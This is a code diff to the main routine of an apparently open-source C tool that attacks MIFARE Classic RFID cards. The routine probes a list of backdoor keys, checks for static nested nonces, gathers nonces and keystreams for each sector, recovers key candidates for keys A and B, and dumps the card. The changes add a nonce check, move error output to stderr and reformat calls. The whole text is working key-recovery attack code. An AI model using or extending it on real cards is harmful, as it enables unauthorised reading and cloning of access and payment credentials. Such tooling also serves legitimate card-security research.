@@ -324,18 +324,16 @@ int main(
     // Anticollision to send raw frames
     mf_select_target();
 
-    uint64_t backdoor_key;
-    bool backdoor_success = false;
+    uint64_t backdoor_key = -1;
 
     for (size_t i = 0; i < backdoor_keys_len; i++)
     {
         fprintf(stdout, "\rKey: %012llX (%10zu / %zu) -> ", backdoor_keys[i], i + 1, backdoor_keys_len);
 
         // Advanced verification at sector 0
-        if (mf_nested_auth(MC_AUTH_A + 4, MC_AUTH_A, sector_to_trailer(0), backdoor_keys[i], auth_uid, NULL, NULL, false))
+        if (mf_nested_auth(MC_AUTH_A + 4, MC_AUTH_A, 0, backdoor_keys[i], auth_uid, NULL, NULL, false))
         {
             backdoor_key = backdoor_keys[i];
-            backdoor_success = true;
             fprintf(stdout, "Success!");
             break;
         }
@@ -348,10 +346,28 @@ int main(
     fprintf(stdout, "\n\n");
     free(backdoor_keys);
 
-    if (!backdoor_success)
+    if (backdoor_key == -1)
     {
         fprintf(stdout, "Card is not vulnerable to backdoor attack, or has no known key...\n\n");
         goto dump_card;
+    }
+
+    // Check if the card has static nonces
+    for (uint32_t nt, nt_prev, i = 0; i < 4; i++)
+    {
+        if (!mf_nested_auth(MC_AUTH_A + 4, MC_AUTH_A, 0, backdoor_key, auth_uid, &nt, NULL, false))
+        {
+            fprintf(stderr, "Failed to authenticate the same sector using backdoor?\n");
+            exit(EXIT_FAILURE);
+        }
+
+        if (i > 0 && nt != nt_prev)
+        {
+            fprintf(stdout, "Card does not have static nested nonces... maybe try hardnested\n\n");
+            goto dump_card;
+        }
+
+        nt_prev = nt;
     }
 
     // Collect nonces and keystreams
@@ -363,17 +379,25 @@ int main(
             continue;
 
         // Save nonces for both key A/B
-        if (!mf_nested_auth(MC_AUTH_A + 4, MC_AUTH_A + 4, sector_to_trailer(s), backdoor_key, auth_uid, &sectors[s].nt_a, &sectors[s].par_a, true) ||
-            !mf_nested_auth(MC_AUTH_A + 4, MC_AUTH_A, sector_to_trailer(s), backdoor_key, auth_uid, &sectors[s].nt_enc_a, &sectors[s].par_enc_a, false))
+        if (!mf_nested_auth(
+                MC_AUTH_A + 4, MC_AUTH_A + 4, sector_to_trailer(s), backdoor_key,
+                auth_uid, &sectors[s].nt_a, &sectors[s].par_a, true) ||
+            !mf_nested_auth(
+                MC_AUTH_A + 4, MC_AUTH_A, sector_to_trailer(s), backdoor_key,
+                auth_uid, &sectors[s].nt_enc_a, &sectors[s].par_enc_a, false))
         {
-            fprintf(stdout, "Failed to authenticate sector %02d, key A using backdoor command\n", s);
+            fprintf(stderr, "Failed to authenticate sector %02d, key A using backdoor command\n", s);
             exit(EXIT_FAILURE);
         }
 
-        if (!mf_nested_auth(MC_AUTH_B + 4, MC_AUTH_B + 4, sector_to_trailer(s), backdoor_key, auth_uid, &sectors[s].nt_b, &sectors[s].par_b, true) ||
-            !mf_nested_auth(MC_AUTH_B + 4, MC_AUTH_B, sector_to_trailer(s), backdoor_key, auth_uid, &sectors[s].nt_enc_b, &sectors[s].par_enc_b, false))
+        if (!mf_nested_auth(
+                MC_AUTH_B + 4, MC_AUTH_B + 4, sector_to_trailer(s), backdoor_key,
+                auth_uid, &sectors[s].nt_b, &sectors[s].par_b, true) ||
+            !mf_nested_auth(
+                MC_AUTH_B + 4, MC_AUTH_B, sector_to_trailer(s), backdoor_key,
+                auth_uid, &sectors[s].nt_enc_b, &sectors[s].par_enc_b, false))
         {
-            fprintf(stdout, "Failed to authenticate sector %02d, key B using backdoor command\n", s);
+            fprintf(stderr, "Failed to authenticate sector %02d, key B using backdoor command\n", s);
             exit(EXIT_FAILURE);
         }
     }
@@ -388,15 +412,17 @@ int main(
     {
         uint8_t lfsr16_common[0x10000] = { 0 };
 
-        uint64_t *recovery_keys_a;
-        size_t recovery_keys_a_len;
+        uint64_t *recovery_keys_a, *recovery_keys_b;
+        size_t recovery_keys_a_len, recovery_keys_b_len;
 
         if (!sectors[s].found_key_a)
         {
             // Generate candidates
-            if (!recover_keys(sectors[s].nt_a, sectors[s].nt_enc_a, sectors[s].par_a, sectors[s].par_enc_a, auth_uid, &recovery_keys_a, &recovery_keys_a_len))
+            if (!recover_keys(
+                    sectors[s].nt_a, sectors[s].nt_enc_a, sectors[s].par_a, sectors[s].par_enc_a,
+                    auth_uid, &recovery_keys_a, &recovery_keys_a_len))
             {
-                fprintf(stdout, "Failed to allocate memory for recovery_keys_a\n");
+                fprintf(stderr, "Failed to allocate memory for recovery_keys_a\n");
                 exit(EXIT_FAILURE);
             }
 
@@ -411,14 +437,13 @@ int main(
             }
         }
 
-        uint64_t *recovery_keys_b;
-        size_t recovery_keys_b_len;
-
         if (!sectors[s].found_key_b)
         {
-            if (!recover_keys(sectors[s].nt_b, sectors[s].nt_enc_b, sectors[s].par_b, sectors[s].par_enc_b, auth_uid, &recovery_keys_b, &recovery_keys_b_len))
+            if (!recover_keys(
+                    sectors[s].nt_b, sectors[s].nt_enc_b, sectors[s].par_b, sectors[s].par_enc_b,
+                    auth_uid, &recovery_keys_b, &recovery_keys_b_len))
             {
-                fprintf(stdout, "Failed to allocate memory for recovery_keys_b\n");
+                fprintf(stderr, "Failed to allocate memory for recovery_keys_b\n");
                 exit(EXIT_FAILURE);
             }
 
@@ -555,7 +580,7 @@ dump_card:
                 auth_success = true;
             else
             {
-                fprintf(stderr, "Authentication with key A to a known sector %02d failed?\n", s);
+                fprintf(stderr, "Failed to authenticate sector %02d with a known A key?\n", s);
                 exit(EXIT_FAILURE);
             }
         }
@@ -565,7 +590,7 @@ dump_card:
                 auth_success = true;
             else
             {
-                fprintf(stderr, "Authentication with key B to a known sector %02d failed?\n", s);
+                fprintf(stderr, "Failed to authenticate sector %02d with a known B key?\n", s);
                 exit(EXIT_FAILURE);
             }
         }
